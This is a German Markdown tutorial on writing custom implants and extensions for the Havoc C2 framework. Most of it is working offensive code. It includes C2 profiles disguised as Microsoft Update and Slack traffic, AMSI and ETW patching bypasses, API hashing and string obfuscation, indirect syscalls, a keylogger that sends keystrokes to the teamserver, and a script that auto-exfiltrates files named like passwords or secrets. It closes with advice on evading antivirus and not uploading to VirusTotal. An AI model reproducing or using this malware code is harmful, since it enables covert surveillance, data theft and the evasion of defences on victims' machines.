# Payload-Entwicklung für Havoc C2

> **Ziel:** Eigene Payloads, Module und Erweiterungen für Havoc entwickeln.

---

## 📋 Inhaltsverzeichnis

1. [Havoc Demon Architektur](#havoc-demon-architektur)
2. [Custom Payload-Konfiguration](#custom-payload-konfiguration)
3. [Demon-Anpassung (Source-Level)](#demon-anpassung-source-level)
4. [BOF (Beacon Object Files) Entwicklung](#bof-beacon-object-files-entwicklung)
5. [Python-Extensions](#python-extensions)
6. [Evasion-Techniken](#evasion-techniken)
7. [Custom Modules](#custom-modules)
8. [Payload-Obfuskation](#payload-obfuskation)
9. [Testing & Debugging](#testing--debugging)

---

## Havoc Demon Architektur

### Was ist ein "Demon"?

Ein Demon ist Havocs Beacon/Agent:
- **Implant:** Läuft auf Target-System
- **C2-Kommunikation:** Beaconing zu Teamserver
- **Post-Ex:** Führt Kommandos aus
- **Modular:** Erweit erbar mit BOFs

### Demon-Komponenten

```
payloads/Demon/
├── Source/
│   ├── Core/        # Hauptlogik (Beaconing, Tasking)
│   ├── Crypt/       # Verschlüsselung (AES, RC4)
│   ├── Inject/      # Process Injection
│   ├── Asm/         # Shellcode, Syscalls
│   └── Main.c       # Entry Point
├── Include/         # Header-Dateien
└── CMakeLists.txt   # Build-Konfiguration
```

---

## Custom Payload-Konfiguration

### Profile-basierte Anpassung

In `havoc.yaotl` können Sie Demon-Verhalten anpassen:

```yaml
Demon:
  # Sleep & Jitter
  Sleep: 10                    # Sekunden zwischen Beacons
  Jitter: 30                   # % Variation (3-13 Sek)
  
  # Verschlüsselung
  Encryption:
    Key: "MyCustomKey123"      # AES-Key
    IV: "MyInitVector456"      # Initialization Vector
  
  # Injection-Methode
  Injection:
    Spawn64: "C:\\Windows\\System32\\RuntimeBroker.exe"
    Spawn86: "C:\\Windows\\SysWOW64\\RuntimeBroker.exe"
  
  # Evasion
  IndirectSyscalls: true       # Nutze indirekte Syscalls
  SleepMask: true              # Verschleiere Speicher während Sleep
  StackDuplication: true       # Dupliziere Stack (Anti-Scan)
  
  # Limits
  KillDate: "2026-12-31"       # Demon stirbt nach diesem Datum
  WorkingHours: "08:00-18:00"  # Nur während Geschäftszeiten aktiv
  
  # HTTP/HTTPS-spezifisch
  Http:
    Headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml"
      Accept-Language: "en-US,en;q=0.9"
    
    Uris:
      - "/api/v2/auth"
      - "/api/v2/sync"
      - "/content/updates"
    
    HostRotation: true         # Rotiere zwischen Hosts
```

### Ausgefeilte HTTP-Profile

```yaml
# Tarnung als Microsoft Update
Http:
  Headers:
    Host: "update.microsoft.com"
    User-Agent: "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.0"
    Content-Type: "application/soap+xml; charset=utf-8"
  
  Uris:
    - "/v9/windowsupdate/redir/muauth.cab"
    - "/v9/windowsupdate/selfupdate/wuident.cab"
  
  Method: "POST"
```

```yaml
# Tarnung als Slack
Http:
  Headers:
    Host: "hooks.slack.com"
    User-Agent: "Slackbot-LinkExpanding 1.0"
    Content-Type: "application/json"
  
  Uris:
    - "/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX"
  
  Method: "POST"
```

---

## Demon-Anpassung (Source-Level)

### Voraussetzungen

```bash
# Compiler
sudo apt install mingw-w64 gcc g++ cmake nasm

# Havoc Source
cd ~/c2-lab/Havoc/payloads/Demon
```

### Build-Prozess verstehen

```bash
# Standard-Build (über Teamserver)
# Wird automatisch gemacht wenn Payload generiert wird

# Manueller Build
cd ~/c2-lab/Havoc/payloads/Demon
mkdir build && cd build
cmake ..
make
```

### Demon Source-Struktur

```c
// payloads/Demon/Source/Main.c

#include <Demon.h>

VOID DemonMain( PVOID ModuleInst, DWORD Reason )
{
    INSTANCE Instance = { 0 };
    
    if ( Reason == DLL_PROCESS_ATTACH )
    {
        // Initialisierung
        Instance.Modules.Kernel32 = LoadLibraryA( "kernel32.dll" );
        Instance.Modules.Ntdll    = LoadLibraryA( "ntdll.dll" );
        
        // Resolve API-Funktionen
        DemonInit( &Instance );
        
        // Main Loop starten
        DemonRoutine( &Instance );
    }
}
```

---

### Custom Feature hinzufügen

**Beispiel: Automatischer Screenshot bei Login**

```c
// payloads/Demon/Source/Core/Screenshot.c (NEU ERSTELLEN)

#include <Demon.h>
#include <windows.h>

VOID AutoScreenshotOnLogin( PINSTANCE Instance )
{
    // Warte auf Benutzer-Aktivität
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    
    if ( GetLastInputInfo( &lii ) )
    {
        DWORD idleTime = GetTickCount() - lii.dwTime;
        
        // Wenn User gerade eingeloggt (< 30 Sek Idle)
        if ( idleTime < 30000 )
        {
            // Screenshot machen
            CaptureScreen( Instance );
            
            // Warte um Spam zu vermeiden
            SleepObf( 300000 ); // 5 Minuten
        }
    }
}
```

**In Main.c integrieren:**

```c
// payloads/Demon/Source/Main.c

#include "Core/Screenshot.h"

VOID DemonRoutine( PINSTANCE Instance )
{
    while ( TRUE )
    {
        // Normale Beacon-Logik
        BeaconCheck( Instance );
        
        // NEU: Auto-Screenshot
        AutoScreenshotOnLogin( Instance );
        
        // Sleep
        SleepObf( Instance->Config.Sleep );
    }
}
```

**Neu kompilieren:**

```bash
cd ~/c2-lab/Havoc/payloads/Demon/build
make clean && make
```

---

### Evasion: Strings verschlüsseln

**Problem:** Strings wie "kernel32.dll" sind in Binary sichtbar.

**Lösung:** String-Obfuskation

```c
// payloads/Demon/Include/Crypt.h

#define OBFUSCATE(str) DecryptString(str)

PCHAR DecryptString( PCHAR encrypted )
{
    // XOR-Dekodierung
    static CHAR decrypted[256];
    DWORD key = 0xDEADBEEF;
    
    for ( int i = 0; encrypted[i] != '\0'; i++ )
    {
        decrypted[i] = encrypted[i] ^ ( key >> ( i % 4 ) * 8 );
    }
    
    return decrypted;
}
```

**Vorher:**

```c
LoadLibraryA( "kernel32.dll" );
```

**Nachher:**

```c
LoadLibraryA( OBFUSCATE( "\x37\x52\x45..." ) ); // Verschlüsselter String
```

---

### API-Hashing (Import-Versteckung)

```c
// payloads/Demon/Source/Asm/ApiHash.c

PVOID GetProcAddressByHash( PVOID Module, DWORD Hash )
{
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Module;
    PIMAGE_NT_HEADERS NtHeader  = (PIMAGE_NT_HEADERS)( (PBYTE)Module + DosHeader->e_lfanew );
    
    PIMAGE_EXPORT_DIRECTORY ExportDir = 
        (PIMAGE_EXPORT_DIRECTORY)( (PBYTE)Module + 
        NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    
    PDWORD AddressOfNames = (PDWORD)( (PBYTE)Module + ExportDir->AddressOfNames );
    
    for ( DWORD i = 0; i < ExportDir->NumberOfNames; i++ )
    {
        PCHAR FunctionName = (PCHAR)( (PBYTE)Module + AddressOfNames[i] );
        
        if ( HashString( FunctionName ) == Hash )
        {
            PWORD AddressOfNameOrdinals = (PWORD)( (PBYTE)Module + ExportDir->AddressOfNameOrdinals );
            PDWORD AddressOfFunctions   = (PDWORD)( (PBYTE)Module + ExportDir->AddressOfFunctions );
            
            return (PVOID)( (PBYTE)Module + AddressOfFunctions[ AddressOfNameOrdinals[i] ] );
        }
    }
    
    return NULL;
}
```

**Verwendung:**

```c
// Vorher:
PVOID VirtualAlloc = GetProcAddress( GetModuleHandle("kernel32.dll"), "VirtualAlloc" );

// Nachher:
PVOID VirtualAlloc = GetProcAddressByHash( GetModuleHandle("kernel32.dll"), 0x91AFCA54 );
```

---

## BOF (Beacon Object Files) Entwicklung

### Was sind BOFs?

BOFs sind kleine, kompilierte C-Programme die:
- Im Demon-Prozess ausgeführt werden
- Keine eigene Binary sind (RDI - Reflective DLL Injection)
- Schnell und leichtgewichtig sind

### BOF-Struktur

```c
// mybof.c

#include <windows.h>
#include <stdio.h>

// BOF-Einstiegspunkt
void go( char * args, int length )
{
    // Argumente parsen
    datap parser;
    BeaconDataParse( &parser, args, length );
    
    char * targetHost = BeaconDataExtract( &parser, NULL );
    int    port       = BeaconDataInt( &parser );
    
    // Funktionalität
    SOCKET s = socket( AF_INET, SOCK_STREAM, 0 );
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port   = htons( port );
    server.sin_addr.s_addr = inet_addr( targetHost );
    
    if ( connect( s, (struct sockaddr*)&server, sizeof(server) ) == 0 )
    {
        BeaconPrintf( CALLBACK_OUTPUT, "[+] Connected to %s:%d\n", targetHost, port );
    }
    else
    {
        BeaconPrintf( CALLBACK_ERROR, "[-] Connection failed\n" );
    }
    
    closesocket( s );
}
```

### BOF kompilieren

```bash
# Für x64
x86_64-w64-mingw32-gcc -c mybof.c -o mybof.o

# Für x86
i686-w64-mingw32-gcc -c mybof.c -o mybof.o
```

### BOF in Havoc laden

**Via Python-Script:**

```python
# ~/c2-lab/Havoc/scripts/load-bof.py

from havoc import Demon

def load_bof( demon_id ):
    # BOF-Datei lesen
    with open( "mybof.o", "rb" ) as f:
        bof_data = f.read()
    
    # An Demon senden
    Demon( demon_id ).InlineExecute( bof_data, "192.168.1.10", 445 )
```

**Via Havoc Extension:**

```python
# ~/c2-lab/Havoc/client/ext/mybof.py

from havoc import *

class MyBOF( Extension ):
    
    Name = "MyBOF"
    Description = "Custom BOF for port checking"
    
    Commands = {
        "portcheck": {
            "Description": "Check if port is open",
            "Usage": "portcheck <host> <port>",
            "Execute": portcheck_execute
        }
    }

def portcheck_execute( demon, args ):
    if len( args ) != 2:
        return False
    
    host = args[0]
    port = int( args[1] )
    
    # BOF laden
    with open( "mybof.o", "rb" ) as f:
        bof_data = f.read()
    
    # Argumente packen
    bof_args = pack( "zi", host, port )
    
    # Ausführen
    demon.InlineExecute( bof_data, bof_args )
    
    return True
```

**Extension laden:**

```bash
# In Havoc Client
Havoc → Scripts → Load Script → mybof.py
```

**Verwendung:**

```bash
# In Demon-Session
portcheck 192.168.1.10 445
```

---

## Python-Extensions

### Havoc Python-API

```python
from havoc import *

class MyExtension( Extension ):
    Name        = "MyExtension"
    Description = "Custom Havoc Extension"
    Version     = "1.0"
    Author      = "YourName"
    
    Commands = {}  # Kommandos hier

# Initialisierung
def on_load( havoc ):
    havoc.logger.info( "Extension loaded!" )

def on_unload( havoc ):
    havoc.logger.info( "Extension unloaded!" )
```

### Beispiel: Auto-Exfiltration

```python
# ~/c2-lab/Havoc/client/ext/auto_exfil.py

from havoc import *
import os

class AutoExfil( Extension ):
    
    Name = "AutoExfil"
    Description = "Automatically exfiltrate interesting files"
    
    Commands = {
        "auto-exfil": {
            "Description": "Start auto-exfiltration",
            "Usage": "auto-exfil <path>",
            "Execute": auto_exfil_execute
        }
    }

def auto_exfil_execute( demon, args ):
    if len( args ) != 1:
        demon.console_message( "Usage: auto-exfil <path>", ERROR )
        return False
    
    target_path = args[0]
    
    # Interessante Dateien definieren
    file_patterns = [
        "*.docx", "*.xlsx", "*.pdf", 
        "*.txt", "*.log", "password*", 
        "*secret*", "*confidential*"
    ]
    
    demon.console_message( f"[*] Scanning {target_path}...", INFO )
    
    # Für jedes Pattern
    for pattern in file_patterns:
        # Dateien finden
        cmd = f'dir /s /b "{target_path}\\{pattern}"'
        result = demon.shell( cmd )
        
        if result:
            files = result.split( "\n" )
            
            for file in files:
                if file.strip():
                    # Download
                    demon.console_message( f"[+] Downloading {file}", SUCCESS )
                    demon.download( file )
    
    demon.console_message( "[*] Auto-exfiltration complete!", INFO )
    return True
```

### Beispiel: Multi-Demon-Orchestrierung

```python
# ~/c2-lab/Havoc/client/ext/orchestrate.py

from havoc import *

class Orchestrator( Extension ):
    
    Name = "Orchestrator"
    Description = "Control multiple Demons at once"
    
    Commands = {
        "mass-command": {
            "Description": "Execute command on all Demons",
            "Usage": "mass-command <command>",
            "Execute": mass_command_execute
        }
    }

def mass_command_execute( havoc, args ):
    if len( args ) < 1:
        return False
    
    command = " ".join( args )
    demons = havoc.demons()  # Alle aktiven Demons
    
    havoc.logger.info( f"Executing '{command}' on {len(demons)} Demons..." )
    
    for demon in demons:
        demon.console_message( f"[*] Executing: {command}", INFO )
        demon.shell( command )
    
    return True
```

---

## Evasion-Techniken

### 1. AMSI Bypass (PowerShell)

```c
// payloads/Demon/Source/Core/AmsiBypass.c

VOID BypassAMSI( VOID )
{
    // AMSI-DLL laden
    HMODULE hAmsi = LoadLibraryA( "amsi.dll" );
    
    if ( hAmsi )
    {
        // AmsiScanBuffer-Funktion finden
        PVOID AmsiScanBuffer = GetProcAddress( hAmsi, "AmsiScanBuffer" );
        
        if ( AmsiScanBuffer )
        {
            // Patch: Immer return AMSI_RESULT_CLEAN
            DWORD oldProtect;
            VirtualProtect( AmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect );
            
            // x64: mov eax, 0 ; ret
            BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
            memcpy( AmsiScanBuffer, patch, sizeof(patch) );
            
            VirtualProtect( AmsiScanBuffer, 6, oldProtect, &oldProtect );
        }
    }
}
```

### 2. ETW (Event Tracing) Bypass

```c
// payloads/Demon/Source/Core/EtwBypass.c

VOID BypassETW( VOID )
{
    HMODULE hNtdll = LoadLibraryA( "ntdll.dll" );
    
    if ( hNtdll )
    {
        PVOID EtwEventWrite = GetProcAddress( hNtdll, "EtwEventWrite" );
        
        if ( EtwEventWrite )
        {
            DWORD oldProtect;
            VirtualProtect( EtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect );
            
            // Patch: ret
            *(BYTE*)EtwEventWrite = 0xC3;
            
            VirtualProtect( EtwEventWrite, 1, oldProtect, &oldProtect );
        }
    }
}
```

### 3. Syscall-Wrapper (Indirect Syscalls)

```asm
; payloads/Demon/Source/Asm/Syscall.asm

.code

; Indirect Syscall-Stub
SyscallStub PROC
    mov r10, rcx
    mov eax, [syscall_number]  ; Dynamische SSN
    jmp qword ptr [syscall_addr] ; Springe zu echtem Syscall
SyscallStub ENDP

END
```

```c
// payloads/Demon/Source/Core/Syscalls.c

NTSTATUS IndirectSyscall( DWORD SSN, PVOID SyscallAddr, ... )
{
    // Syscall Number und Adresse setzen
    syscall_number = SSN;
    syscall_addr   = SyscallAddr;
    
    // Syscall ausführen
    return SyscallStub( ... );
}
```

---

## Custom Modules

### Post-Ex-Modul: Keylogger

```c
// payloads/Demon/Source/Modules/Keylogger.c

#include <Demon.h>
#include <windows.h>

typedef struct {
    CHAR  buffer[4096];
    DWORD index;
} KEYLOGGER;

LRESULT CALLBACK KeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    static KEYLOGGER logger = {0};
    
    if ( nCode >= 0 && wParam == WM_KEYDOWN )
    {
        KBDLLHOOKSTRUCT * kbd = (KBDLLHOOKSTRUCT*)lParam;
        
        // Taste zu String
        CHAR key[32];
        GetKeyNameTextA( kbd->scanCode << 16, key, sizeof(key) );
        
        // In Buffer speichern
        logger.index += sprintf( 
            &logger.buffer[logger.index], 
            "[%s]", 
            key 
        );
        
        // Buffer voll? Sende zu Teamserver
        if ( logger.index > 3800 )
        {
            BeaconOutput( CALLBACK_OUTPUT, logger.buffer, logger.index );
            logger.index = 0;
            memset( logger.buffer, 0, sizeof(logger.buffer) );
        }
    }
    
    return CallNextHookEx( NULL, nCode, wParam, lParam );
}

VOID StartKeylogger( PINSTANCE Instance )
{
    HHOOK hHook = SetWindowsHookExA( 
        WH_KEYBOARD_LL, 
        KeyboardProc, 
        NULL, 
        0 
    );
    
    if ( hHook )
    {
        MSG msg;
        while ( GetMessage( &msg, NULL, 0, 0 ) )
        {
            TranslateMessage( &msg );
            DispatchMessage( &msg );
        }
    }
}
```

**Command hinzufügen:**

```c
// payloads/Demon/Source/Core/Commands.c

else if ( CommandID == DEMON_COMMAND_KEYLOG_START )
{
    StartKeylogger( Instance );
}
```

---

## Payload-Obfuskation

### Polymorphic Code

```python
# ~/c2-lab/tools/polymorphic_payload.py

import random
import string

def generate_junk_code( length=100 ):
    """Generiere zufälligen, nutzlosen Code"""
    junk = []
    
    for _ in range( random.randint( 5, 15 ) ):
        var = ''.join( random.choices( string.ascii_lowercase, k=8 ) )
        val = random.randint( 1, 1000 )
        junk.append( f"int {var} = {val};" )
        junk.append( f"{var} += {random.randint(1,100)};" )
    
    return "\n".join( junk )

def obfuscate_payload_template( payload_path ):
    """Füge Junk-Code vor Main-Funktion ein"""
    with open( payload_path, 'r' ) as f:
        source = f.read()
    
    # Finde Main-Funktion
    main_pos = source.find( "void DemonMain" )
    
    # Füge Junk-Code davor ein
    junk = generate_junk_code()
    obfuscated = source[:main_pos] + junk + "\n\n" + source[main_pos:]
    
    # Speichere
    with open( payload_path + ".obf", 'w' ) as f:
        f.write( obfuscated )
    
    print( f"[+] Obfuscated payload saved to {payload_path}.obf" )

# Verwendung
obfuscate_payload_template( "payloads/Demon/Source/Main.c" )
```

### Control-Flow Obfuscation

```c
// Vorher: Linearer Code
void ExecuteCommand( int cmd ) {
    if ( cmd == 1 ) {
        DoA();
    } else if ( cmd == 2 ) {
        DoB();
    } else {
        DoC();
    }
}

// Nachher: Obfuscated Control-Flow
void ExecuteCommand( int cmd ) {
    int state = 0x1337 ^ cmd;
    
    while ( TRUE ) {
        switch ( state ) {
            case 0x1336:
                DoA();
                state = 0xDEAD;
                break;
            case 0x1335:
                DoB();
                state = 0xBEEF;
                break;
            case 0x1334:
                DoC();
                state = 0xCAFE;
                break;
            case 0xDEAD:
            case 0xBEEF:
            case 0xCAFE:
                return;
            default:
                state = (state ^ 0x1337) + 0x1334;
        }
    }
}
```

---

## Testing & Debugging

### Lokal debuggen

```bash
# Demon mit Debug-Symbols kompilieren
cd ~/c2-lab/Havoc/payloads/Demon/build
cmake -DCMAKE_BUILD_TYPE=Debug ..
make

# GDB nutzen
gdb ./demon.exe

# Breakpoints setzen
(gdb) break DemonMain
(gdb) run

# Memory inspizieren
(gdb) x/100x $rsp
```

### Payload-Testing-Matrix

| Test-Typ | Tool | Zweck |
|----------|------|-------|
| **Static Analysis** | `strings`, `objdump` | Strings/Imports finden |
| **AV Detection** | Windows Defender | Real-World-Test |
| **Sandbox** | Any.run, Hybrid-Analysis | Verhaltens-Analyse |
| **Memory Scan** | Moneta, pe-sieve | In-Memory-Detection |
| **YARA** | yara | Signature-Matching |

### CI/CD für Payloads

```yaml
# .github/workflows/build-demon.yml

name: Build Demon

on:
  push:
    branches: [ develop ]

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y mingw-w64 cmake
    
    - name: Build Demon
      run: |
        cd payloads/Demon
        mkdir build && cd build
        cmake ..
        make
    
    - name: Upload artifact
      uses: actions/upload-artifact@v2
      with:
        name: demon-payload
        path: payloads/Demon/build/demon.exe
```

---

## Best Practices

### ✅ DO's

1. **Teste lokal zuerst** - Debugge vor Production
2. **Version Control** - Git für alle Änderungen
3. **Obfuskation-Layers** - Mehrere Techniken kombinieren
4. **Modularer Code** - Einfach zu erweitern
5. **Dokumentation** - Kommentiere komplexe Funktionen
6. **Testing** - Automated Testing wo möglich

### ❌ DON'T's

1. **Nie Payloads zu VirusTotal** hochladen!
2. **Keine Hardcoded-Credentials** in Payloads
3. **Kein Copy-Paste** von Public-Exploits ohne Anpassung
4. **Keine Debug-Strings** in Production
5. **Nicht auf einer Technik** verlassen (Defense-in-Depth)

---

## Weitere Ressourcen

- **Havoc Demon Source:** https://github.com/HavocFramework/Havoc/tree/main/payloads/Demon
- **BOF Development:** https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm
- **Syscalls & EDR Bypass:** https://github.com/jthuraisamy/SysWhispers2
- **Malware Dev:** https://github.com/topics/malware-development

---

**Erstellt:** 2026-02-05
**Version:** 1.0
